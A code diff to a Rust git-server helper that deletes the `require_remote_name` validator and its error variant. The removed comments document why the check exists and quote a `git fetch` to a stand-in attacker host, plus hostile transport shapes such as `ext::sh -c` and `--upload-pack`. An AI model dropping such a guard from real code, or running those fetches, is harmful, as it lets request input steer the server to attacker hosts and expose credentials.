@@ -38,12 +38,6 @@ pub enum PlanFieldError {
     /// The value is not a path relative to the worktree root: it is absolute,
     /// carries a `..` component, or embeds a NUL byte (#219).
     NotWorktreeRelative(&'static str),
-    /// The value is not a plain remote *name*: it carries a character no
-    /// remote nickname may (`:`, `/`, `@`, `~`, whitespace, …), starts with
-    /// `.`, or embeds `..` — i.e. it is URL-shaped or path-shaped, and git
-    /// would resolve it as a transport target rather than looking it up in
-    /// the repository's configuration (ADR 0047).
-    NotRemoteName(&'static str),
 }
 
 impl fmt::Display for PlanFieldError {
@@ -65,13 +59,6 @@ impl fmt::Display for PlanFieldError {
                     f,
                     "{field} must be relative to the worktree root — no leading '/' and \
                      no '..' component"
-                )
-            }
-            PlanFieldError::NotRemoteName(field) => {
-                write!(
-                    f,
-                    "{field} must be the name of a remote configured in this repository \
-                     (letters, digits, '.', '-' and '_'), not a URL or a path"
                 )
             }
         }
@@ -154,70 +141,6 @@ pub(crate) fn require_worktree_relative_path(
         .any(|component| component == ".." || component == ".")
     {
         return Err(PlanFieldError::NotWorktreeRelative(field));
-    }
-    Ok(())
-}
-
-/// The wire-boundary gate for the *name of a configured remote* (ADR 0047):
-/// [`require_git_safe`]'s non-empty/not-option-shaped check, a length cap, and
-/// then the rule that matters — the value must be a plain nickname, never a
-/// transport target.
-///
-/// # Why a name-shaped value is a security boundary, not tidiness
-///
-/// `git fetch <arg>` does **not** refuse an argument that is not a configured
-/// remote. It falls through to treating it as a URL or a path: verified
-/// against git 2.43.0, `git fetch https://attacker.example/r.git` connects,
-/// and `git fetch ghost.git` inside a repository with no such remote fetches
-/// from the *directory* `ghost.git`. So an unvalidated `remote` field is a
-/// request field that chooses which host this server — and whatever
-/// credential helper or SSH agent the host offers it — opens a socket to.
-/// `docs/adr/0002-versioned-api-contract.md` already refuses a request that
-/// names a repository *path* for the same reason; this is the same refusal
-/// one field over.
-///
-/// # The rule
-///
-/// ASCII letters, digits, `.`, `-` and `_`, with no leading `.` and no `..`
-/// anywhere. That is a superset of every remote nickname `git remote add`
-/// produces in practice (`origin`, `upstream`, `fork-2`, `remote.v2`) and a
-/// strict subset of the character sets every transport target needs:
-///
-/// | Shape | Refused by |
-/// |---|---|
-/// | `https://host/r.git`, `git://…`, `ssh://…`, `file://…` | `:` and `/` |
-/// | `git@host:r.git` (scp-style) | `@` and `:` |
-/// | `/abs/path`, `./rel`, `../sibling` | `/`, leading `.` |
-/// | `~/private.git`, `~user/r.git` | `~` |
-/// | `ext::sh -c …` (git's command transport) | `:` and space |
-/// | `-u`, `--upload-pack=…` | [`require_git_safe`] |
-///
-/// **Necessary but not sufficient**, in exactly the sense
-/// [`require_worktree_relative_path`] documents for itself: a name that
-/// passes here can still be one the repository has never configured
-/// (`ghost.git` above), and git resolves *that* as a relative path. No
-/// string rule can see the repository's config. That half is enforced at
-/// execution time by `git-vista-server`'s `planner::enforce_fresh`, which
-/// refuses when `Precondition::RemoteConfigured` did not hold — see
-/// `planner::refuses_when_unmet_at_build`.
-pub(crate) fn require_remote_name(
-    value: &str,
-    field: &'static str,
-    max: usize,
-) -> Result<(), PlanFieldError> {
-    require_git_safe(value, field)?;
-    if value.len() > max {
-        return Err(PlanFieldError::TooLong { field, max });
-    }
-    let charset_ok = value
-        .bytes()
-        .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-' || b == b'_');
-    // A leading `.` is refused for the same reason `require_worktree_relative_path`
-    // refuses a `.` component: `.` and `..` are paths, and `.anything` is the
-    // shape a hidden relative path takes. `..` is refused anywhere, not only at
-    // the start, so `a..b` cannot become a traversal in some later joined path.
-    if !charset_ok || value.starts_with('.') || value.contains("..") {
-        return Err(PlanFieldError::NotRemoteName(field));
     }
     Ok(())
 }
